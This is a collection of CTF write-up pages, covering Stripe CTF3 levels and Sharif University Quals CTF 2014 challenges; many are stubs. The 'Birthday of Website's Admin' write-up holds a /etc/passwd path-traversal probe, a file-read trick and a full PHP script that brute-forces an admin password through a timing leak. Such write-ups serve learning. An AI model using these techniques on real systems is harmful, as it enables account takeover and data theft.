your jar is assembled; if it is, it runs the jar, and if not, uses sbt[1].

To start all of your nodes, run `bin/start-servers`. This will start a
master search node, and three search nodes. The master node is the only
node that we communicate with.

The master node runs on port 9090 (and the search nodes on 9091, 9092, and
9093). Once the servers are up, you can point your browser at
http://localhost:9090 to communicate with (and query) the master node.

As always, to submit your code, first commit, and then run `git push`.

You can test your code locally via `test/harness`[2]. You can use the
harness to download the test cases we run your code against.

Note that the input is generated randomly on a seed; we'll always run
against the same dictionary (the harness will download that dictionary for
you if you don't have it).

## Constraints

We're limiting the amount of memory that each of your nodes gets to 500mb.

When running your solution, we'll give you up to 4 minutes to index,
after which, ready or not, we'll start sending queries your way!

(We'll be polling `/isIndexed` in the meanwhile, and if at any point, you're
ready to start accepting queries, we'll start sending them.)

## Scoring

The scoring in this level is based on a single metric: the average request
latency over 50 requests. Your score is a function of the ratio of your
average response time to the default solution.

To beat the level, you will have to perform 4 times as fast as the default
solution in this repository.

Good luck!

[1] Scala Build Tool: http://www.scala-sbt.org/
# Stripe CTF3: level3

## Description

[`git grep`](https://www.kernel.org/pub/software/scm/git/docs/git-grep.html) is nice and convenient for finding code in a single repository on your current disk. [Google Code Search](http://en.wikipedia.org/wiki/Google_Code_Search), and now [GitHub Code Search](https://github.com/blog/1381-a-whole-new-code-search), have shown how great it is to be able to search across all of your code at once.

But what if you want to search across all of your on-disk code? Ideally, there’d be a tool which indexes all of it for you, allowing you to perform instant search. For very low latency (which would allow cool things like typeahead search), you might distribute that work across multiple machines.

Any guesses where this is going? :)

For this level, you’ll be building a distributed instant code search. We’ve provided [a skeleton of a code search system written in Scala](https://github.com/ctfs/write-ups/tree/master/stripe-ctf3/level3/problem) for you; it’s too slow for anyone to be happy calling it instant code search though. Your job is to get queries to complete with much lower latency.

## Write-up

One solution is to implement a path-sharded in-memory scan.

(TODO)

## Other write-ups or solutions

* <http://muehe.org/posts/stripe-ctf-3-writeup/>
* <http://tullo.ch/articles/stripe-ctf-golfing/>
* [Gibybo’s write-up](https://news.ycombinator.com/item?id=7180991)
* [Jon Eisen’s write-up](http://blog.joneisen.me/post/75008410654)
* [Evan Priestley’s write-up](http://blog.phacility.com/post/stripe_ctf3/)
* [Samuel Walker’s write-up](http://www.samuelwalker.me.uk/2014/01/stripe-ctf3-write-up/)
* <https://github.com/henrik-muehe/level3>
* <https://github.com/metcalf/ctf3/tree/master/level3>
* <https://github.com/xthexder/stripe-ctf-3.0>
* <https://github.com/vinzenz/stripe-ctf3-solutions/tree/master/level3>
* <https://github.com/kratorius/stripe-ctf3/tree/master/level3>
* [Solution in Node.js](https://gist.github.com/yanatan16/9694fc5cae878bbe90d8)
* [Burst trie implementation in Scala, used as part of the top-scoring solution](https://github.com/nbauernfeind/scala-burst-trie)
* [2nd place solution](https://github.com/lericson/stripe-ctf3/tree/level3)
* [Original problems including a modified test harness that works locally](https://github.com/janosgyerik/stripe-ctf3)
# SQLCluster

SQLCluster makes your SQLite highly-available.

## Getting started

To run this level, you'll need a working Go installation. If you don't
have one yet, it's quite easy to obtain. Just grab the appropriate
installer from:

  https://code.google.com/p/go/downloads/list

Then set your GOPATH environment variable:

  http://golang.org/doc/code.html#GOPATH

It'll probably be convenient to check this code out into
$GOPATH/src/stripe-ctf.com/sqlcluster (that way, `go build` will know
how to compile it without help). However, you can use the provided
`build.sh` regardless of where you happened to check this level out.

## Building and running

Run `./build.sh` to build the SQLCluster binary.

As always, you can run test cases via `test/harness`. This will
automatically fetch and compile Octopus, download your test cases, and
score your level for you.

Octopus will print out your score, together with how it arrived at
said score.

## Protocol

SQCluster communicates with the outside world over HTTP. The public
interface is simple:

  POST /sql:

    input:  A raw SQL body

    output: A message with the form "SequenceNumber: $n", followed
            by the output of that SQL command.

Run `./build.sh` to build SQLCluster and have it print out some
example usage (including `curl`s you can run locally).

## Supported platforms

SQLCluster has been tested on Mac OSX and Linux. It may work on other
platforms, but we make no promises. If it's not working for you, see
https://stripe-ctf.com/about#development for advice on getting a
development environment similar to our own.
# Stripe CTF3: level4

## Description

Last night, your master MySQL database fell over in the middle of the night, causing you to wake up and perform an emergency failover. In the meanwhile, your entire site was down, relying on your sleepy self to remember and run the correct sequence of commands.

This has you thinking: there's got to be a better way. You know that there are [lots](http://www.allthingsdistributed.com/files/amazon-dynamo-sosp2007.pdf) [of](http://docs.mongodb.org/manual/replication/) [systems](http://www.datastax.com/docs/1.0/cluster_architecture/replication) [out](http://zookeeper.apache.org/doc/r3.1.2/zookeeperInternals.html) [there](https://github.com/coreos/etcd) which provide automatic failover and high-availability. Why can’t you have that for your MySQL database too?

Starting today, you can.

In this level, your goal is to build a multi-node [highly-available](http://www.firstsql.com/highavailability.html) SQL database that behaves identically to a single node, even in the presence of network or node failures.

We’ve given you [starter code for such a database](https://github.com/ctfs/write-ups/tree/master/stripe-ctf3/level4/problem), written in [Go](http://golang.org/). The database uses a home-grown failover scheme, which it turns out doesn’t work very well in practice.

You’ll likely find [`README.md`](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level4/problem/README.md) to be helpful in getting your bearings.

To actually test how your code handles failure scenarios, `test/harness` uses our network simulator, [Octopus](https://github.com/stripe-ctf/octopus), which will spin up your nodes and proxy their communication (acting as a [lossy network](http://www.dataexpedition.com/support/notes/tn0021.html)). Octopus will then start issuing SQL queries to all nodes at once, checking at each step to make sure your output looks exactly like what it gets by running the same queries locally.

## Write-up

The hard part of distributed databases really comes down to state replication — given one server that’s received a write request, how does it make sure the other servers know about that write before it’s accepted? Fortunately, there are a number of algorithms for this, such as [Paxos](http://research.microsoft.com/en-us/um/people/lamport/pubs/paxos-simple.pdf) and [Raft](https://ramcloud.stanford.edu/wiki/download/attachments/11370504/raft.pdf).

One solution would be to add [the Go implementation of the Raft distributed consensus protocol](https://github.com/goraft/raft) to [the provided starter code](https://github.com/ctfs/write-ups/tree/master/stripe-ctf3/level4/problem).

(TODO)

## Other write-ups or solutions

* [Top-scoring solution for this challenge (see “`level5`”)](https://github.com/xthexder/stripe-ctf-3.0)
* <http://tullo.ch/articles/stripe-ctf-golfing/>
* <http://muehe.org/posts/stripe-ctf-3-writeup/>
* [Gibybo’s write-up](https://news.ycombinator.com/item?id=7180991)
* [Jon Eisen’s write-up](http://blog.joneisen.me/post/75008410654)
* [Evan Priestley’s write-up](http://blog.phacility.com/post/stripe_ctf3/)
* [Samuel Walker’s write-up](http://www.samuelwalker.me.uk/2014/01/stripe-ctf3-write-up/)
* <https://github.com/henrik-muehe/level4>
* <https://github.com/metcalf/ctf3/tree/master/level4>
* <https://github.com/rrjamie/stripe-ctf-level4>
* <https://github.com/vinzenz/stripe-ctf3-solutions/tree/master/level4>
* <https://github.com/kratorius/stripe-ctf3/tree/master/level4>
* <https://github.com/lericson/stripe-ctf3/tree/level4>
* <https://github.com/yanatan16/stripe-ctf3-level4>
* [Original problems including a modified test harness that works locally](https://github.com/janosgyerik/stripe-ctf3)
# Stripe CTF3 write-ups

* <https://stripe-ctf.com/>
* <https://stripe.com/blog/ctf3-launch>
* <https://stripe.com/blog/ctf3-wrap-up>
* [Blog post on CTF3’s architecture](https://stripe.com/blog/ctf3-architecture) [(video)](https://www.youtube.com/watch?v=zktac6QKzUk&hd=1)

## Completed write-ups

* [level0](level0)
* [level1](level1)
* [level2](level2)

## External write-ups only

* [level3](level3)
* [level4](level4)

## Missing write-ups

* none
# Sharif University Quals CTF 2014: 2048

**Category:** Reverse
**Points:** 200
**Solves** 60
**Description:**

> What is the ip of the victim?
>
> Falg is: md5(ip)
> [Download](2048.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/24/>
# Sharif University Quals CTF 2014: AES Broken

**Category:** Cryptography
**Points:** 300
**Solves** 18
**Description:**

> This cipher-text is outputted by AES-192. Can you break it and get the flag?!
>
> [Download](ciphertext.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/31/>
# Sharif University Quals CTF 2014: Avatar

**Category:** Steganography
**Points:** 20
**Solves** 22
**Description:**

> A terrorist has changed his picture in a social network. What is the hidden message?
>
> [Download](lamb.jpg)

## Write-up

Using `outguess -r lamb.jpg out`, we retrieve the flag in `out`: `We should blow up the bridge at midnight`.

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/10/>
# Sharif University Quals CTF 2014: A Trip to Sao Paulo

**Category:** Network
**Points:** 300
**Solves** 5
**Description:**

> That was strange! I was on a trip to Sao Paulo, I think it was March 14 or 15. I was browsing the web, and then all of a sudden My DNS lookups get weird and I start getting certificate errors, and then after a while, things were back to normal. I should add I was using 8.8.8.8
>
> FLAG="event_start_time:event_end_time" time is of format HH:mm:ss

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/30/>
# Sharif University Quals CTF 2014: Birthday of Website's Admin

**Category:** Web
**Points:** 400 + 80
**Solves** 0
**Description:**

> This website
> <http://ctf.sharif.edu:16481/login.php>
> is more secure than what you may think :)
>
> Flag is SHA1(Birthday of website's admin, formatted as YYYYMMDD).

## Write-up

Investigating all parts of the site, you'll see that the root page includes two iframes. Each iframe sends a request to news.php with a parameter "title". This parameters seems interesting. Specially, when it is modified, the server rejects by sending an empty response.

Trying some known files: **index.php login.php ../index.php ../../../../../../etc/passwd**; but no success.

Maybe something, e.g. an extension, is concatenated. Unfortunately, **index.php%00** does not work, but, yes, **index.php%20** works!

Lets see the source code of **login.php** via **http://ctf.sharif.edu:16481/news.php?title=login.php%20 **:
```php
<?php
session_start();
if (isset ($_SESSION['login_status']) and $_SESSION['login_status'] === 'authenticated') { // already logged in
  session_write_close ();
  header('Location: /profile.php', true, 303);
  exit (0);
}
$anyerror = false;
if (isset($_POST['action']) && $_POST['action'] === 'login') {
  define ('SAFTY_CHECK', true);
  include 'internals/log.php';
  include 'internals/db.php';
  $useragent=md5($_SERVER['HTTP_USER_AGENT']);
  $username=$_POST['username'];
  $password=$_POST['password'];
  $expected_password = db_retreive_password ($username);
  $anyerror = is_null ($expected_password) || $anyerror;
  $anyerror = strlen ($username) < 3 || $anyerror;
  $anyerror = strlen ($username) > 20 || $anyerror;
  $anyerror = strlen ($password) < 3 || $anyerror;
  $anyerror = strlen ($password) > 50 || $anyerror;
  if ($anyerror === false) {
    check_for_log_rotation ('9cccf42e43cd2eb379259dba5077b1a7.log');
    mylog ('9cccf42e43cd2eb379259dba5077b1a7.log', $useragent, 'checking password');
    for ($i = 0; $i < strlen ($expected_password) and $i < strlen ($password); $i = $i + 1) {
      if (substr ($password, $i, 1) != substr ($expected_password, $i, 1)) { // mismatch
        $anyerror = true;
        break;
      }
    }
    if (strlen ($expected_password) != strlen ($password)) {
      $anyerror = true;
    }
    if ($anyerror) {
      mylog ('9cccf42e43cd2eb379259dba5077b1a7.log', $useragent, 'wrong password');
    } else {
      mylog ('9cccf42e43cd2eb379259dba5077b1a7.log', $useragent, 'correct password');
      $_SESSION['login_status'] = 'authenticated';
      $_SESSION['username'] = $username;
      session_write_close ();
      header('Location: /profile.php', true, 303); // <http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html#sec10.3.4>;
      exit (0);
    }
  }
}
session_write_close ();
?>
```

There is a log file named **9cccf42e43cd2eb379259dba5077b1a7.log** which seems interesting.

Fetching **http://ctf.sharif.edu:16481/news.php?title=9cccf42e43cd2eb379259dba5077b1a7.log%20**, you will see the log file.

```
The log file is rotated. previous logs are moved to 9cccf42e43cd2eb379259dba5077b1a7.log.backup-1411770914 file.
1411770914.5129 | d41d8cd98f00b204e9800998ecf8427e | checking password
1411770914.513 | d41d8cd98f00b204e9800998ecf8427e | wrong password
1411770914.5334 | fa06a7c9d42ae5b386feae5b01f48a3f | checking password
1411770914.5335 | fa06a7c9d42ae5b386feae5b01f48a3f | wrong password
1411770915.7109 | d41d8cd98f00b204e9800998ecf8427e | checking password
1411770915.711 | d41d8cd98f00b204e9800998ecf8427e | wrong password
1411770915.7178 | 8efa52fbb9c4c46940e54b0dae76d8ba | checking password
1411770915.7179 | 8efa52fbb9c4c46940e54b0dae76d8ba | wrong password
1411770916.1378 | fa06a7c9d42ae5b386feae5b01f48a3f | checking password
1411770916.1379 | fa06a7c9d42ae5b386feae5b01f48a3f | wrong password
1411770917.1523 | 8efa52fbb9c4c46940e54b0dae76d8ba | checking password
...
```
It contains log time, the md5 of user-agent, and the log string. So what? After some investigation, you will notice that the password checking code is interesting:
```php
    for ($i = 0; $i < strlen ($expected_password) and $i < strlen ($password); $i = $i + 1) {
      if (substr ($password, $i, 1) != substr ($expected_password, $i, 1)) { // mismatch
        $anyerror = true;
        break;
      }
    }
    if (strlen ($expected_password) != strlen ($password)) {
      $anyerror = true;
    }
```

It has a time-leackage vulnerability but needs a highly-accurate time sampling. The logs' timestamps help now.

The strategy is as follows:
* Bruteforce the password by a script.
* To guess position 1, try all alphanumeric characters (first guess) and monitor the checking time by fetching the log and extracting your latest logs.
* The md5 of user agent now determines your own logs between the others.
* Each letter which consumes more processing time is the right one.
* Then, proceed to the second letter and so on.
* Be careful that passwords shorter than 3 characters are not processed at all, and it flats the processing time. Choose a dummy three-letter password (for example, " ") and guess the first position.
* Also be aware that a non-existing username also breaks this process. So, enter "admin" as the username from the beginning.

The following script will do this.
```php
<?php
	define('REPEAT_NUM', 3);

	// create curl resource 
	$ch = curl_init(); 

	$useragent = 'mymymyuseragent';

	//return the transfer as a string 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 

	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch,CURLOPT_ENCODING , 'gzip');

	curl_setopt($ch, CURLOPT_COOKIESESSION, true);
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.jar');
	curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.data');

	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'User-Agent: $useragent'
	));

	$charset = array('0', '1', '2', '3', 1'4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f',/*
		'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
		'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S',
		'T', 'U', 'V', 'W', 'X', 'Y', 'Z'*/);

	$pass = '   ';

	for ($ind = 0; $ind < 50; $ind++)
	{
		echo 'PASS (so far): $pass\n';

		$choices_table = array();
		$choices_sum  = 0;

		foreach ($charset as $val)
		{
			$repeats_sum = 0;
			for ($repeat = 0; $repeat < REPEAT_NUM; $repeat++)
			{
				// try login
				$pass[$ind] = $val;

				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=login&username=admin&password=$pass');

				curl_setopt($ch, CURLOPT_URL, 'http://.../login.php');
				$output = curl_exec($ch); 
				if ($output === false)
					die('CURL ERROR: ' . curl_error($ch) . '\n\n');

				// check time in logs
				curl_setopt($ch, CURLOPT_POST, 0);

				curl_setopt($ch, CURLOPT_URL, 'http://.../news.php?title=9cccf42e43cd2eb379259dba5077b1a7.log%20');
				$output = curl_exec($ch); 
				if ($output === false)
					die('CURL ERROR: ' . curl_error($ch) . '\n\n');

				$logs = explode('\n', $output);
				$mylogs = array_values(preg_grep('/' . md5($useragent) . '/', $logs));

				if (sizeof($mylogs) == 0)
					die('LOG OUTPUT: $output\n\n');
				
				sscanf($mylogs[sizeof($mylogs)-2], '%f', $start);
				sscanf($mylogs[sizeof($mylogs)-1], '%f', $end);
				$time = round($end * 10000 - $start * 10000);

				$repeats_sum += $time;
			}

			$avgtime = (float)$repeats_sum / REPEAT_NUM;
			$choices_table[$val] = $avgtime;
			echo 'choices_table[$val] = $avgtime\n';
			$choices_sum += $avgtime;
		}

		$avgtime = (float)$choices_sum / sizeof($charset);
		echo '\navgtime=$avgtime\n\n';

		arsort($choices_table);
		
		foreach($choices_table as $letter => $value)
			break;

		if ($value - $avgtime < 0.5)
			die('no noticeable difference\n\n');

		$pass[$ind] = $letter;
	}

	curl_close($ch);
?>
```
Once the password is revealed, login and obtain the birthday of admin.


## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/36/>
# Sharif University Quals CTF 2014: Cafe-1

**Category:** Recon
**Points:** 150
**Solves** 41
**Description:**

> Nice coffee shop, much better than Starbucks! Do you know a professional Logo Designer?! 
> Flag: md5(Nickname)
>
> [Download](cafeteria.jpg)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Sharif University Quals CTF 2014: Cafe-2

**Category:** Recon
**Points:** 150
**Solves** 41
**Description:**

> What was the quote of the day? (see cafe-1) 
> Flag:md5(Quote)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Sharif University Quals CTF 2014: Cafe-3

**Category:** Recon
**Points:** 200
**Solves** 4
**Description:**

> Took the picture first time I went to the coffee shop. I wonder what the date was. I'm pretty sure that the date was not properly configured on my camera! (see cafe-1) 
> Flag: md5(yyyy.MM.dd)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Sharif University Quals CTF 2014: Cafe-4

**Category:** Recon
**Points:** 200
**Solves** 30
**Description:**

> This is my favorite coffee shop, and I do go there regularly. Once there, I saw a strange looking car! Although can't remember when that was. (see cafe-1) 
> Flag: md5(HH:mm) 
> Note: round minute down to 5

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Sharif University Quals CTF 2014: Capture The Spoon

**Category:** Web, Real
**Points:** 250
**Solves** 4
**Description:**

> Find The Flag! 
> <http://ctf.sharif.edu:31455>

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/29/>
# Sharif University Quals CTF 2014: Commercial Application

**Category:** Reverse
**Points:** 200
**Solves** 132
**Description:**

> Flag is a serial number.
>
> [Download](suCTF.apk)

## Write-up

We are given an Android application file `suCTF.apk` and have to look for a serial number, according to the description.

Let's first run it, using an Android Virtual Device and the `adb` tool:

```bash
$ android avd &
$ abd install suCTF.apk
5139 KB/s (1653085 bytes in 0.314s)
	pkg: /data/local/tmp/suCTF.apk
Success
```

We can click on various elements named `Picture-0`, `Picture-1` and `Picture-2` and see an alert box (Toast) when clicking on the latter two elements:

<img src="pics.png" width="311" height="400"/>

If we click on the settings button, we have to insert a Product Key, which might be the serial number the description is talking about.

<img src="key.png" width="323" height="400"/>

So let's reverse `suCTF.apk`, e.g. with an advanced decompiler like [jadx](https://github.com/skylot/jadx) for a good dex to java conversion as well as `apktool` to get everything else, e.g. the resources and the manifest [AndroidManifest.xml](AndroidManifest.xml).

In the manifest, we can see the main entry point, which is [MainActivity.java](MainActivity.java).

In this class, we can see two Strings `NOK_LICENCE_MSG` and `OK_LICENCE_MSG`, which are the response texts after inserting an incorrect or correct serial number. The corresponding switch code is in line 59-65 of `MainActivity.java`, an onClick function of the Button we have to press, when entering a Product key.

The check is done with another class, [KeyVerifier.java](KeyVerifier.java) using it's `isValidLicenceKey` function, which uses three parameters:

	* The user input `userInput`, which is the proposed serial number
	* A secret security key
	* A secret security IV

The function checks if `userInput`, encrypted with an AES-128-CBC cipher using the secret key and iv, is equal to the static licence `VALID\_LICENCE`. This leads to the conclusion that we have to decrypt the licence to get the serial number.

So how do we get the secret key and iv?

The class [AppConfig.java](AppConfig.java) provides the Setter and Getter methods for those secrets. The former methods are called in the [DbHelper.java](DBHelper.java) class:

```
DB_PATH = "/data/data/edu.sharif.ctf/databases/";
DB_NAME = "db.db";
TABLE_NAME = "config";
SELECT_QUERY = "SELECT  * FROM " + TABLE_NAME + " WHERE a=1";
[...]
AppConfig agency = new AppConfig();
Cursor cursor = this.myDataBase.rawQuery(SELECT_QUERY, null);¶
[...]
agency.setSecurityIv(cursor.getString(IcsLinearLayout.SHOW_DIVIDER_END));
gency.setSecurityKey(cursor.getString(FragmentManagerImpl.ANIM_STYLE_FADE_ENTER));
```

`IcsLinearLayout.SHOW\_DIVIDER\_END` and `FragmentManagerImpl.ANIM\_STYLE\_FADE\_ENTER` here are constants, `4` and `5`.

So what this code essentially does is getting the 5th and 6th fields of the `column` table in the `db.db` databases located at `/data/data/edu.sharif.ctf/databases/` and using it as the secret iv (5th field) and secret key (6th field).

Let's get the database with `adb pull /data/data/edu.sharif.ctf/databases/db.db` and analyse [db.db](db.db):

```bash
$ sqlite3 -cmd '.headers ON' db.db <<< '.tables'
config
$ sqlite3 -cmd '.headers ON' db.db <<< 'select * from config;'
a|b|c|d|e|f|g|h|i
1|2|2014|0|a5efdbd57b84ca36|37eaae0141f1a3adf8a1dee655853714|1000|ctf.sharif.edu|9
```

This shows us that the secret key is `37eaae0141f1a3adf8a1dee655853714` and the secret iv is `a5efdbd57b84ca36`.

We can then decrypt the licence and get the flag, e.g. by using [this code](keym.java).

```bash
$ javac keym.java && java keym | xxd -r -p && echo
fl-ag-IS-se-ri-al-NU-MB-ER
```

The flag is `fl-ag-IS-se-ri-al-NU-MB-ER`.
## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/25/>
# Sharif University Quals CTF 2014: Decrypt the Message!

**Category:** Cryptography
**Points:** 100
**Solves** 36
**Description:**

> Decrypt the message!
>
> [Download](encrypted.txt)

## Write-up

We are given a poem and a ciphertxt:

	The life that I have
	Is all that I have
	And the life that I have
	Is yours.
	
	The love that I have
	Of the life that I have
	Is yours and yours and yours.
	
	A sleep I shall have
	A rest I shall have
	Yet death will be but a pause.
	
	For the peace of my years
	In the long green grass
	Will be yours and yours and yours.
	
	decrypted message: emzcf sebt yuwi ytrr ortl rbon aluo konf ihye cyog rowh prhj feom ihos perp twnb tpak heoc yaui usoa irtd tnlu ntke onds goym hmpq

When searching for `poem cipher`, we find the 'poem code' cipher, explained [here](http://wmbriggs.com/post/1001/) and [here](http://en.wikipedia.org/wiki/Poem_code).

After understanding how this cipher works, we can e.g. use [this code](https://github.com/YASME-Tim/crypto-tools/tree/master/poemcode) to encrypt and decrypt the message.

Note that I had to remove all special characters as well as decrypt the ciphertxt with all possible key/word combinations.

The flag is `ifyouthinkcryptographyistheanswertoyourproblemthenyoudonotknowwhatyourproblemisabcdefghijklmnopqrstu`.

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/18/>
# Sharif University Quals CTF 2014: Guess The Number

**Category:** Reverse
**Points:** 30
**Solves** 316
**Description:**

> Guess the number and find the flag.
>
> [Download](guess.jar)

## Write-up

We just have to decompile the `guess.class` inside the `guess.jar` using a decompiler of your choice.
After that, we get the sourcecode [guess.java](guess.java) and can see that we have to guess `my_number/5`, which is `0x5c214f6c/5 = 1545686892/5 = 309137378`.

So if we use this as input for this program using `java guess 309137378`, we get the flag:

> your flag is: a7b08c546302cc1fd2a4d48bf2bf2ddb

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/12/>
# Sharif University Quals CTF 2014: Hear with your Eyes

**Category:** Steganography
**Points:** 100
**Solves** 172
**Description:**

> Hear With Your Eyes
>
> [Download](sound.wav.tar.gz)

## Write-up

We are given a WAVE audio file, `sound.wav`:

```
$ file sound.wav
sound.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 44100 Hz
```

The title says to "hear with your eyes", so we use audacity to look at the spectrum of frequencies in that file using the `spectogram` feature.

![](audacity_specto.png)

And we get the flag `e5353bb7b57578bd4da1c898a8e2d767`:

![](flag.png)

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/19/>
# Sharif University Quals CTF 2014: Hidden Message

**Category:** Steganography
**Points:** 40
**Solves** 47
**Description:**

> What is the hidden message?
>
> [Download](hidden-message.pcap)

## Write-up

The pcap contains an UDP exchange with an excerpt of the [Classical Physics Wiki page](http://en.wikipedia.org/wiki/Classical_physics#Comparison_with_modern_physics).

We can extract the payload using this command:

```
$ tshark -r hidden-message.pcap -Tfields -e data | xxd -r -p
In contrast to classical physics modern physics is a slightly looser term which may refer to just quantum physics or to 20th and 21st century physics in general and so always includes quantum theory and may include relativity
A physical system on the classical level is a physical system in which the laws of classical physics are valid There are no restrictions on the application of classical principles but practically the scale of classical physics is the level of isolated atoms and molecules on upwards including the macroscopic and astronomical realm Inside the atom and among atoms in a molecule the laws of classical physics break down and generally do not provide a correct description
Moreover the classical theory of electromagnetic radiation is somewhat limited in its ability to provide correct descriptions since quantum effects are observable in more everyday circumstances than quantum effects of matter Unlike quantum physics classical physics is generally characterized by the principle of complete determinism although the Manyworlds interpretation of quantum mechanics is in a sense deterministic
Mathematically classical physics equations are ones in which Plancks constant does not appear According to the correspondence principle and Ehrenfests theorem as a system becomes larger or more massive action  Plancks constant the classical dynamics tends to emerge with some exceptions such as superfluidity This is why we can usually ignore quantum mechanics when dealing with everyday objects instead the classical description will suffice However one of the most vigorous ongoing fields of research in physics is classicalquantum correspondence This field of research is concerned with the discovery of how the laws of quantum physics give rise to classical physics in the limit of the large scales of the classical le
```
We can see that the last digit of the source port changes for each requests between the values of 0 and 1, so we try to extract that with `tshark` and evaluate the parsed digits using a quick `perl` binary to ascii converter:
```bash
$ tshark -r hidden-message.pcap -Tfields -e udp.srcport | while read port; do echo -n ${port: -1}; done | perl -lpe '$_=pack"B*",$_'
??????????
```

That's not quite it. Let's try to invert the binary output using `tr` before evaluating the binary output:

```bash
$ tshark -r hidden-message.pcap -Tfields -e udp.srcport | while read port; do echo -n ${port: -1}; done | tr 01 10 | perl -lpe '$_=pack"B*",$_'
Heisenberg
```

Success! The flag is `Heisenberg`!

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/14/>
# Sharif University Quals CTF 2014: Hooked API

**Category:** Forensics
**Points:** 100
**Solves** 39
**Description:**

> Load me and Analyze the memory changes! 
> flag: MD5[LowerCase[Hooked API's Name]] 
> Req : Windows 7/8 32 bit
>
> [Download](Forensic1.sys)

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/20/>
# Sharif University Quals CTF 2014: Huge Key

**Category:** Cryptography
**Points:** 100
**Solves** 119
**Description:**

> Find the flag.
>
> [Download](hugekey.tar.gz)

## Write-up

We are given two files, a `ciphertxt.bin` and a php file `encipher.php`:

[encipher.php](encipher.php)

It uses a key and a random generated IV to encrypt the contents of the unknown file `flag.txt` with the `MCRYPT_RIJNDAEL_128` cipher, also known as the `AES` cipher.

The author of this php file tries to load a 128 bit key by XORing the bytes of `key` with the contents of an unknown file `hugekey.bin`, however (s)he only sets the first two bytes of `key`.

Therefore we can bruteforce the cleartext by decrypting `ciphertext.bin` with the AES cipher using all 65536 possible combinations of this key.

The following code decrypts `ciphertext.bin` and prints all cleartexts matching the substring `flag`:

[rijndael.py](rijndael.py)

Executing it reveals our flag:

```bash
$ python rijndael.py ciphertext.bin
the flag is e3565503fb4be929a214a9e719830d4e
```

Looks like our flag is `e3565503fb4be929a214a9e719830d4e`.
## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/21/>
* [Vietnamese](https://13c5.wordpress.com/2014/09/28/su-ctf-quals-2014-huge-key/)
# Sharif University Quals CTF 2014: Iran Pro League

**Category:** Web
**Points:** 80
**Solves** 87
**Description:**

> Find the flag! 
> <http://ctf.sharif.edu:55474>

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/17/>
# Sharif University Quals CTF 2014: Mining Your Rs and Ss

**Category:** Cryptography
**Points:** 500
**Solves** 6
**Description:**

> Mining Your Rs and Ss (instead of Ps and Qs)
>
> <https://ctf.sharif.edu:44301/>

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Sharif University Quals CTF 2014: Network Traffic

**Category:** Steganography
**Points:** 100
**Solves** 58
**Description:**

> Download the file and find the flag
>
> [Download](traffic.pcap)

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/22/>
# Sharif University Quals CTF 2014: Old Flag

**Category:** Forensics
**Points:** 350
**Solves** 7
**Description:**

> Attached file is captured traffic of a person who was reading CTFs' write-ups. What was the flag of challenge that was downloaded by her?
>
> [Download](capture.cap.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/32/>
# Sharif University Quals CTF 2014: Our Bank is Yours

**Category:** Web, Forensics
**Points:** 200
**Solves** 108
**Description:**

> The police have arrested a cyber criminal but they don't have a good witness. Just a short capture of his network traffic is available . Is it helpful?
>
> The attached file has been updated.
>
> [Download](capture.pcap.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/26/>
# Sharif University Quals CTF 2014: Personalized Captcha

**Category:** Web, Forensics
**Points:** 300
**Solves** 10
**Description:**

> What was the provided captcha for who his traffic is attached?
>
> Beware that captcha.ctf.sharif.edu is not up.
> [Download](captcha.pcap)

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/33/>
# Sharif University Quals CTF 2014: Pwn It

**Category:** Web
**Points:** 300
**Solves** 6
**Description:**

> login and find the flag 
> <http://ctf.sharif.edu:25489>

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/34/>
# Sharif University Quals CTF 2014 write-ups

* <http://ctf.sharif.edu/2014/quals/su-ctf/>
